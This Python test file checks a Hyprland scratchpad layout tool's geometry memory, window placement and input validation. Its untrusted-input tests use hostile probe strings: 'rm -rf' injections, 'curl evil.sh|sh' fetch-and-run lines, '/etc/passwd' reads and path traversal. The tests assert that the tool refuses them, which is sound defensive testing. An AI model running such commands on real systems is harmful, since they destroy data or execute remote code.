#!/usr/bin/env python3
"""Offline checks for the remembering and placement rules.

Runs against fake hyprctl data, so it touches neither a live Hyprland nor the
files under ~/.config. Run it with: python3 test_layout.py
"""

import copy
import sys

import layout

PAD = "special:scratchpad"
DP2 = {"id": 0, "name": "DP-2", "x": 0, "y": 0, "width": 3440, "height": 1440,
       "scale": 1, "focused": True, "specialWorkspace": {"name": PAD}}
SMALL = {"id": 1, "name": "eDP-1", "x": 0, "y": 0, "width": 1920, "height": 1080,
         "scale": 1, "focused": True, "specialWorkspace": {"name": PAD}}
RIGHT = {"id": 2, "name": "HDMI-A-1", "x": 3440, "y": 0, "width": 1920,
         "height": 1080, "scale": 1, "focused": True,
         "specialWorkspace": {"name": PAD}}
# same DP-2, but the pad is showing on the monitor to its right
DP2_IDLE = dict(DP2, focused=False, specialWorkspace={"name": ""})

LAYOUT = {
  "org.omarchy.btop": (12, 38, 846, 1390),
  "foot": (872, 38, 841, 688),
  "chrome-gitlab": (872, 740, 841, 688),
  "md.obsidian.Obsidian": (1727, 38, 1701, 1390),
}

results = []


def check(name, got, want):
  ok = got == want
  results.append(ok)
  print(f"  {'PASS' if ok else 'FAIL'}  {name}")
  if not ok:
    print(f"        got  {got}\n        want {want}")


def client(cls, rect, addr="0x1", workspace=PAD, monitor=0):
  x, y, w, h = rect
  return {"class": cls, "address": addr, "at": [x, y], "size": [w, h],
          "floating": False, "monitor": monitor, "workspace": {"name": workspace}}


def app(cls, rect, monitor="DP-2"):
  x, y, w, h = rect
  return {"id": cls, "name": cls, "class": cls, "command": "true", "icon": "",
          "glyph": "g", "x": x, "y": y, "w": w, "h": h, "floating": False,
          "monitor": monitor}


class Fake:
  """Swap out everything that would otherwise shell out or touch disk."""

  def __init__(self, apps, live, mons=(DP2,)):
    self.saved = copy.deepcopy(apps)
    self.live = live
    self.mons = list(mons)

  def __enter__(self):
    self.orig = {k: getattr(layout, k) for k in
                 ("monitors", "clients", "desktop_entries", "save_remembered",
                  "save_tracker", "remembered", "tracker", "scratchpad_visible")}
    layout.monitors = lambda: self.mons
    layout.clients = lambda: self.live
    layout.desktop_entries = lambda: []
    layout.scratchpad_visible = lambda: True
    layout.tracker = lambda: {}
    layout.save_tracker = lambda a: None
    layout.remembered = lambda: copy.deepcopy(self.saved)
    layout.save_remembered = lambda apps: setattr(self, "saved", copy.deepcopy(apps))
    return self

  def __exit__(self, *a):
    for k, v in self.orig.items():
      setattr(layout, k, v)

  def rects(self):
    return {a["class"]: (a["x"], a["y"], a["w"], a["h"]) for a in self.saved}


# --- the bug this all started with ---------------------------------------
# Closing one tiled window reflows the survivors. Recording that reflow is
# what flattened the remembered layout into a stack of near-identical rects.

print("\nremembering")

apps = [app(c, r) for c, r in LAYOUT.items()]
live = [client(c, r, hex(i)) for i, (c, r) in enumerate(LAYOUT.items())]
with Fake(apps, live) as f:
  layout.sync()
  check("a whole pad records live geometry", f.rects(), LAYOUT)

with Fake(apps, live) as f:
  moved = dict(LAYOUT, foot=(900, 100, 841, 688))
  f.live = [client(c, r, hex(i)) for i, (c, r) in enumerate(moved.items())]
  layout.sync()
  check("a move on a whole pad is recorded", f.rects()["foot"], (900, 100, 841, 688))

with Fake(apps, live) as f:
  alive = list(LAYOUT)
  while alive:
    alive.pop(0)
    # survivors reflow into one wide column, as they do live
    f.live = [client(c, (12, 38 + i * 300, 3416, 300), hex(i))
              for i, c in enumerate(alive)]
    for _ in range(3):          # the poller fires repeatedly per close
      layout.sync()
  check("logging out 4 -> 0 keeps the layout", f.rects(), LAYOUT)

with Fake(apps, []) as f:
  alive = []
  for c in LAYOUT:
    alive.append(c)
    f.live = [client(x, LAYOUT[x], hex(i)) for i, x in enumerate(alive)]
    for _ in range(3):
      layout.sync()
  check("restoring 0 -> 4 keeps the layout", f.rects(), LAYOUT)

with Fake(apps, live) as f:
  f.live = live + [client("org.new", (100, 100, 400, 400), "0xnew")]
  layout.sync()
  check("a new app is recorded with its geometry",
        f.rects().get("org.new"), (100, 100, 400, 400))

with Fake(apps, live[:2]) as f:
  layout.sync()
  check("a gap in the pad reports layoutFrozen", layout.sync()["layoutFrozen"], True)

with Fake(apps, live) as f:
  check("a whole pad reports layoutFrozen false", layout.sync()["layoutFrozen"], False)


# --- placement ------------------------------------------------------------
# Hyprland puts a floating window exactly where it is told, off-desk included.

print("\nplacement")

def target(rect, mons, saved_monitor="DP-2"):
  with Fake([], [], mons):
    geo = layout.target_geometry(app("x", rect, saved_monitor))
    return (geo["x"], geo["y"], geo["w"], geo["h"])

check("a rect that already fits is untouched",
      target((872, 38, 841, 688), (DP2,)), (872, 38, 841, 688))
check("a rect past the right edge is pulled back on",
      target((3200, 38, 841, 688), (DP2,)), (2599, 38, 841, 688))
check("a window wider than the screen is shrunk to fit",
      target((0, 0, 5000, 3000), (SMALL,)), (0, 0, 1920, 1080))
check("an unplugged monitor's rect lands on the one that is left",
      target((1727, 38, 1701, 1390), (SMALL,)), (219, 0, 1701, 1080))
check("a pad on a second monitor gets rects translated onto it",
      target((12, 38, 846, 800), (DP2_IDLE, RIGHT)), (3452, 38, 846, 800))
check("a rect too tall for the second monitor is shrunk there",
      target((12, 38, 846, 1390), (DP2_IDLE, RIGHT)), (3452, 0, 846, 1080))
check("a tiny rect keeps a grabbable size",
      target((0, 0, 10, 10), (DP2,)), (0, 0, 160, 160))

with Fake([], [], (DP2_IDLE, RIGHT)):
  # translated to global 3452,38 on HDMI-A-1, then expressed local to it
  rules = layout.exec_rules(app("x", (12, 38, 846, 800), "DP-2"))
  check("exec rules use monitor-local coordinates",
        "move = {12, 38}" in rules, True)
  check("exec rules float the window", "float = true" in rules, True)


# --- two windows of the same class ---------------------------------------
# They are interchangeable and Wayland gives nothing stable to tell them
# apart across a reboot, so slots are matched by nearest saved rectangle.

print("\nsame-class slots")

TERMS = {"foot": (12, 38, 800, 600), "foot#2": (900, 38, 800, 600)}


def term_app(slot, rect):
  x, y, w, h = rect
  return {"id": slot, "name": "Terminal", "class": "foot", "command": "true",
          "icon": "", "glyph": "g", "x": x, "y": y, "w": w, "h": h,
          "floating": False, "monitor": "DP-2"}


two = [term_app(k, v) for k, v in TERMS.items()]

with Fake([], [client("foot", TERMS["foot"], "0xa"),
               client("foot", TERMS["foot#2"], "0xb")]) as f:
  f.saved = []
  layout.sync()
  check("two same-class windows become two slots",
        sorted(a["id"] for a in f.saved), ["foot", "foot#2"])

with Fake(two, [client("foot", TERMS["foot"], "0xa"),
                client("foot", TERMS["foot#2"], "0xb")]) as f:
  layout.sync()
  check("each slot keeps its own rectangle",
        {a["id"]: (a["x"], a["y"], a["w"], a["h"]) for a in f.saved}, TERMS)

# the same two windows, reported in the opposite order and with fresh
# addresses, as after a reboot -- nearest rectangle still sorts them out
with Fake(two, [client("foot", TERMS["foot#2"], "0xz"),
                client("foot", TERMS["foot"], "0xy")]) as f:
  layout.sync()
  check("slots survive windows arriving in a different order",
        {a["id"]: (a["x"], a["y"], a["w"], a["h"]) for a in f.saved}, TERMS)

# one of the two closes: the survivor must not steal the other's slot
with Fake(two, [client("foot", TERMS["foot#2"], "0xb")]) as f:
  st = layout.sync()
  check("one of two closing leaves one placeholder",
        [p["id"] for p in st["placeholders"]], ["foot"])
  check("one of two closing freezes tracking", st["layoutFrozen"], True)
  check("the survivor keeps its own rectangle",
        {a["id"]: (a["x"], a["y"], a["w"], a["h"]) for a in f.saved}, TERMS)

with Fake(two, []) as f:
  st = layout.sync()
  check("both closed gives two distinguishable tiles",
        [p["label"] for p in st["placeholders"]], ["Terminal 1", "Terminal 2"])

with Fake([app("foot", (12, 38, 800, 600))], []) as f:
  st = layout.sync()
  check("a lone slot is not numbered", [p["label"] for p in st["placeholders"]], ["foot"])

with Fake(two, []) as f:
  layout.forget("foot#2")
  check("forgetting one slot leaves the other",
        [a["id"] for a in f.saved], ["foot"])

# a config written before slots existed keys on the bare class
with Fake([app("foot", (12, 38, 800, 600))],
          [client("foot", (12, 38, 800, 600), "0xa")]) as f:
  layout.sync()
  check("an old config still matches its window",
        [a["id"] for a in f.saved], ["foot"])


# --- a program running inside a terminal ---------------------------------
# If cliamp was playing, the user wants cliamp back, not a bare prompt.

print("\nrunning programs")

def tui_app(slot, cls, name, command, rect=(10, 10, 400, 300)):
  x, y, w, h = rect
  return {"id": slot, "name": name, "class": cls, "command": command, "icon": "",
          "glyph": "g", "x": x, "y": y, "w": w, "h": h, "floating": True,
          "monitor": "DP-2"}


cliamp = tui_app("foot#2", "foot", "cliamp", "omarchy-launch-tui cliamp")
plain = tui_app("foot", "foot", "Terminal", "omarchy-launch-terminal")

check("a remembered TUI restores under its own app-id",
      layout.restore_class(cliamp), "org.omarchy.cliamp")
check("a plain terminal keeps its own class",
      layout.restore_class(plain), "foot")
check("a slot answers to both classes while it is still a terminal",
      layout.app_classes(cliamp), {"foot", "org.omarchy.cliamp"})
check("the launcher command stays inside the existing allowlist",
      layout.is_safe_command(cliamp["command"]), True)
check("a detected name that is not a safe slug is refused",
      layout.is_safe_command("omarchy-launch-tui ../evil"), False)

# once restored, the window really is org.omarchy.cliamp and the entry converges
converged = dict(cliamp, **{"class": "org.omarchy.cliamp"})
check("a converged slot no longer answers to the terminal class",
      layout.app_classes(converged), {"org.omarchy.cliamp"})

check("two identical names are numbered",
      sorted(layout.display_labels([plain, dict(plain, id="foot#3")]).values()),
      ["Terminal 1", "Terminal 2"])
check("distinct names sharing a class are not numbered",
      sorted(layout.display_labels([plain, cliamp]).values()),
      ["Terminal", "cliamp"])


# --- a tile that can never be started ------------------------------------
# An app with no trusted command never fills its slot, so the pad is never
# whole and geometry is never recorded again. That has to be visible.

print("\nunrestorable tiles")

mystery = {"id": "zzmystery", "name": "Mystery", "class": "zzmystery", "command": "",
           "icon": "", "glyph": "g", "x": 10, "y": 10, "w": 400, "h": 300,
           "floating": True, "monitor": "DP-2"}
term = app("foot", (12, 38, 800, 600))
term["command"] = "omarchy-launch-terminal"

with Fake([term, mystery], [client("foot", (12, 38, 800, 600), "0xa")]) as f:
  st = layout.sync()
  flags = {p["id"]: p["restorable"] for p in st["placeholders"]}
  check("a tile with no trusted command is flagged unrestorable", flags, {"zzmystery": False})
  check("an unrestorable tile keeps the pad frozen", st["layoutFrozen"], True)

with Fake([term, mystery], [client("foot", (999, 777, 500, 400), "0xa")]) as f:
  layout.sync()
  moved = next(a for a in f.saved if a["id"] == "foot")
  check("a move is discarded while an unrestorable tile is remembered",
        (moved["x"], moved["y"]), (12, 38))

# acknowledging it is what unsticks tracking
with Fake([term, mystery], [client("foot", (999, 777, 500, 400), "0xa")]) as f:
  layout.forget("zzmystery")
  layout.sync()
  moved = next(a for a in f.saved if a["id"] == "foot")
  check("acknowledging the tile resumes tracking",
        (moved["x"], moved["y"]), (999, 777))

with Fake([term, mystery], []) as f:
  st = layout.sync()
  check("a normal missing app is still restorable",
        {p["id"]: p["restorable"] for p in st["placeholders"]},
        {"foot": True, "zzmystery": False})


# --- untrusted input ------------------------------------------------------
# Window class, window title and .desktop contents all come from other
# applications. None of them may become a command or a path of our choosing.

print("\nuntrusted input")

check("a window class is never run as a command",
      layout.command_for_client({"class": "rm -rf ~", "title": "x"}, [])[1], "")
check("a plausible-looking class is still not a command",
      layout.command_for_client({"class": "curl evil.sh|sh", "title": "x"}, [])[1], "")

# `$`-anchored patterns can match before a trailing newline, so check both
# that an embedded newline is refused and that a trailing one is normalised
# away rather than surviving into the command that runs.
for probe in ("omarchy-launch-tui btop\nrm -rf /",
              "omarchy-launch-webapp https://ok.test\nrm -rf /",
              "gtk-launch ok.desktop\nrm -rf /"):
  check(f"an embedded newline is refused: {probe.split(chr(10))[0][:28]!r}",
        layout.is_safe_command(probe), False)

check("a trailing newline is normalised, not smuggled",
      ("omarchy-launch-tui btop\n".strip(), layout.is_safe_command("omarchy-launch-tui btop\n")),
      ("omarchy-launch-tui btop", True))

check("a command outside the allowlist is refused",
      layout.is_safe_command("sh -c 'curl evil.test | sh'"), False)
check("a launcher with an argument smuggled in is refused",
      layout.is_safe_command("omarchy-launch-tui btop; rm -rf /"), False)
check("a non-https webapp url is refused",
      layout.is_safe_command("omarchy-launch-webapp file:///etc/passwd"), False)

# lua strings are built by hand, so quoting has to hold
check("a quote cannot close the lua string",
      layout.lua_str("a'b"), "'a\\'b'")
check("a backslash cannot escape the closing quote",
      layout.lua_str("a\\"), "'a\\\\'")

# icon paths reach an Image in the overlay
check("an absolute icon path outside the icon trees is refused",
      layout.resolve_icon("/etc/passwd"), "")
check("an icon path cannot climb out of the icon trees",
      layout.resolve_icon("../../../../etc/hostname"), "")
check("a real icon still resolves",
      layout.resolve_icon("foot").startswith("/"), True)

# a name is a claim; a binary this account can replace is not a safe target
import os, shutil, tempfile
tmpdir = tempfile.mkdtemp()
planted = os.path.join(tmpdir, "evil")
open(planted, "w").close()
os.chmod(planted, 0o755)
real_which = shutil.which
try:
  shutil.which = lambda n: planted if n == "evil" else real_which(n)
  check("a class pointing at a binary we could plant is refused",
        layout.command_for_client({"class": "org.omarchy.evil", "title": "x"}, [])[1], "")
  check("plantable() sees a writable target", layout.plantable(planted), True)
finally:
  shutil.which = real_which
check("plantable() clears a system binary",
      layout.plantable("/usr/bin/env"), False)

print(f"\n{sum(results)}/{len(results)} passed")
sys.exit(0 if all(results) else 1)
